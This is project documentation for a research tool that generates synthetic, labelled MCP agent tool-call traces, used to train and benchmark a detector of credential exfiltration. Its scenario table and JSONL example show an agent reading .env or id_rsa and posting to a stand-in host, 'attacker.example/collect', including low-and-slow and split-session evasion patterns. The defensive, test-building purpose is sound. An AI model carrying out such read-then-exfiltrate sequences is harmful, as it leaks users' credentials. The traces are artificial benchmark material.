# Segment 1 Documentation: IntentBench-Lite Trace Dataset & Generation Engine

**Author**: IntentGuard AI Team  
**Date**: August 2026  
**Status**: Completed & Verified  

---

## 1. Executive Summary & Objective

Segment 1 delivers the **Trace Dataset Generation & Validation Engine** for IntentGuard MVP. In multi-MCP security research, evaluating cross-server attack detection requires standardized, step-labeled event traces containing both malicious data-exfiltration campaigns and realistic benign workflows (including superficial "confounder" traces).

This module operates independently of local LLM setup (such as Ollama), allowing rapid, deterministic, reproducible generation of hundreds of labeled trace files for developing and benchmarking the Cross-MCP Temporal Attack Graph (CTAG).

---

## 2. System Architecture & Module Map

```
intentguard-mvp/
├── generator/
│   ├── __init__.py
│   ├── trace_generator.py     # Core generator for 7 scenario patterns (S1-S4, B1-B3)
│   └── schema_validator.py    # Schema integrity & ground-truth validation rules
├── tests/
│   ├── __init__.py
│   └── test_trace_generator.py # Automated pytest suite for generator & validator
└── docs/
    └── SEGMENT_1_DATASET_GENERATOR.md  # Mentor update & architecture documentation
```

### Key Components

1. **`generator/trace_generator.py`**:
   - Generates step-labeled traces across **7 standardized scenario categories**.
   - Simulates realistic execution parameters: microsecond-to-minute temporal jitter, path variations, file sensitivity keyword tagging, and payload entropy ratings.
   - Provides `generate_dataset(n_per_scenario, seed)` and `save_dataset_to_dir()` functions.

2. **`generator/schema_validator.py`**:
   - Enforces valid JSON structure, ISO8601 timestamps, server classifications (`filesystem` or `webhook`), and bounds on the ground-truth `pivot_step`.
   - Ensures benign traces strictly set `pivot_step = None` and malicious traces possess valid non-negative step indices.

3. **`tests/test_trace_generator.py`**:
   - Automated unit test suite verifying schema validation, scenario counts, pivot step constraints, corruption rejection, and JSONL disk serialization.

---

## 3. Scenario Taxonomy & Research Rationale

| Scenario ID | Category | Label | Objective | Sequence Sketch | Research Purpose / Role |
| :--- | :--- | :---: | :--- | :--- | :--- |
| **S1_obvious_attack** | Malicious | `1` | `credential_exfiltration` | Read `id_rsa` $\rightarrow$ Immediate Webhook POST | Direct attack control case |
| **S2_realistic_attack** | Malicious | `1` | `credential_exfiltration` | Read `README` $\rightarrow$ Read `config.json` $\rightarrow$ Read `.env` $\rightarrow$ Webhook POST | Realistic credential theft escalation |
| **S3_low_and_slow** | Malicious | `1` | `credential_exfiltration` | Benign file reads interleaved with `.env` read $\rightarrow$ Delayed Webhook POST | Tests resilience against noisy cover traffic |
| **S4_split_session** | Malicious | `1` | `credential_exfiltration` | Read `.env` in Session 1 $\rightarrow$ Webhook POST 20 min later in Session 2 | Tests cross-session temporal correlation |
| **B1_benign_docs** | Benign Plain | `0` | `benign` | Read `README` $\rightarrow$ Read `docs/index.md` $\rightarrow$ Webhook POST to docs server | Baseline for zero false-positive evaluation |
| **B2_benign_cicd** | Benign Similar | `0` | `benign` | Read build `config.json` $\rightarrow$ Webhook POST build status to Slack | **Critical Confounder**: Legitimate workflow with filesystem read followed by webhook call |
| **B3_benign_template** | Benign Similar | `0` | `benign` | Read `.env.example` (template file) $\rightarrow$ Webhook POST setup log | **Critical Confounder**: Prevents model from naively flagging any file path containing "env" |

### Why Confounder Traces (B2 & B3) Matter for Mentor Reviews
Without B2 and B3, a security model could achieve 100% detection accuracy by using a shallow, ungeneralizable heuristic: *"flag any session that reads a file and then makes a webhook POST"*. Confounder traces force the CTAG model to learn **genuine semantic risk** (e.g. sensitive key file access, exact entity overlap between file content and HTTP payload, and high-entropy outbound data).

---

## 4. Trace JSONL Format Specification

Each trace is serialized into a `.jsonl` file in `traces/` containing three distinct line types:

```json
{"type": "header", "trace_id": "8f3b2a1c-...", "label": "malicious", "objective": "credential_exfiltration", "pivot_step": 3, "scenario": "S2_realistic_attack"}
{"type": "event", "step": 0, "timestamp": "2026-01-01T09:00:01.240120", "server": "filesystem", "tool": "read_file", "args": {"path": "README.md"}, "args_entities": ["readme"], "result_summary": "ok:420 bytes"}
{"type": "event", "step": 1, "timestamp": "2026-01-01T09:00:03.110450", "server": "filesystem", "tool": "read_file", "args": {"path": "config.json"}, "args_entities": ["config"], "result_summary": "ok:340 bytes"}
{"type": "event", "step": 2, "timestamp": "2026-01-01T09:00:05.420110", "server": "filesystem", "tool": "read_file", "args": {"path": ".env"}, "args_entities": ["env"], "result_summary": "ok:512 bytes"}
{"type": "event", "step": 3, "timestamp": "2026-01-01T09:00:07.890330", "server": "webhook", "tool": "post_to_webhook", "args": {"url": "http://attacker.example/collect", "payload_entropy": "high"}, "args_entities": ["exfil"], "result_summary": "ok:200"}
{"type": "footer", "total_events": 4}
```

---

## 5. Verification & Test Suite Summary

Segment 1 functionality is backed by automated tests in [`tests/test_trace_generator.py`](file:///c:/Users/Parv%20Saini/Desktop/intentguard-mvp/tests/test_trace_generator.py):

```bash
python -m pytest tests/test_trace_generator.py -v
```

### Verified Test Cases:
1. `test_scenario_generator_counts`: Confirms exact trace output counts across all 7 scenario generators.
2. `test_trace_schema_validation`: Confirms 100% pass rate on generated traces against schema validator.
3. `test_malicious_and_benign_pivot_steps`: Validates that malicious traces have valid non-negative pivot step indices pointing to a webhook POST event, while benign traces have `pivot_step = None`.
4. `test_schema_validator_rejections`: Confirms that invalid traces (missing fields, out-of-bound pivot indices, invalid server names) are caught and rejected.
5. `test_save_and_read_traces`: Confirms JSONL formatting, header/footer structure, and disk I/O.

---

## 6. How to Run & Usage Example

```python
from generator.trace_generator import generate_dataset, save_dataset_to_dir

# 1. Generate 350 traces (50 per scenario across 7 scenarios)
traces = generate_dataset(n_per_scenario=50, seed=42)
print(f"Generated {len(traces)} traces.")

# 2. Save traces to the traces/ directory
saved_paths = save_dataset_to_dir(traces, output_dir="traces")
print(f"Saved {len(saved_paths)} trace files to disk.")
```

---

## 7. Next Step in Roadmap: Segment 2

With Segment 1 complete and verified, the project advances to **Segment 2: CTAG Graph Construction & Feature Extractor**, which will use these traces to construct NetworkX temporal attack graphs and compute per-step feature vectors for early threat forecasting.
